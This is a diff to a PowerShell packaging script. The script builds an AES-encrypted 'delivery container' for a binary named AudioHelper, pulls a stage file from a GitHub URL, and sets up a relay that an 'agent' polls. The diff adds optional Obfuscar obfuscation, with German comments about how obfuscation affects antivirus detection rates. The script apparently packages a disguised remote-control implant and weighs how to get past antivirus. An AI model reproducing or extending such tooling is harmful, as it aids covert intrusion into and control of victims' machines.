@@ -1,4 +1,4 @@
-﻿<#
+<#
   pack.ps1 - builds the encrypted delivery container.
 
   Result in dist\:
@@ -21,7 +21,11 @@ param(
     [string]$StageUrl = 'https://raw.githubusercontent.com/USER/REPO/main/Stage.txt',
     [string]$RelayUrl = '',
     [string]$OutDir = 'dist',
-    [switch]$SkipBuild
+    [switch]$SkipBuild,
+    # Verschleiert Typen/Methoden und versteckt Zeichenketten. Standardmaessig
+    # AUS: Obfuskation erhoeht die Trefferquote der Virenscanner, und das Paket
+    # ist im Transport ohnehin AES-verschluesselt.
+    [switch]$Obfuscate
 )
 
 $ErrorActionPreference = 'Stop'
@@ -53,6 +57,23 @@ $exe = Join-Path $appDir 'AudioHelper.exe'
 $appDll = Join-Path $appDir 'AudioHelper.dll'
 foreach ($f in @($exe, $appDll)) {
     if (-not (Test-Path -LiteralPath $f)) { throw "missing: $f" }
+}
+
+# Optional: Verschleierung. Nur wenn ausdruecklich verlangt und das Werkzeug da
+# ist - ein fehlendes Werkzeug soll den Build nicht kippen.
+if ($Obfuscate) {
+    $tool = Get-Command obfuscar.console -ErrorAction SilentlyContinue
+    if ($tool) {
+        Write-Step 'obfuscate (Obfuscar)'
+        Push-Location $root
+        try { & obfuscar.console (Join-Path $root 'obfuscar.xml') | Out-Null }
+        finally { Pop-Location }
+        $obf = Join-Path $build 'obf\AudioHelper.dll'
+        if (Test-Path -LiteralPath $obf) {
+            Copy-Item -LiteralPath $obf -Destination $appDll -Force
+            Write-Step 'AudioHelper.dll ersetzt'
+        } else { Write-Step 'Obfuscar lieferte nichts - weiter ohne' }
+    } else { Write-Step 'obfuscar.console fehlt - weiter ohne' }
 }
 
 # relay address: the phone talks to this host, the agent polls it. Shipped inside
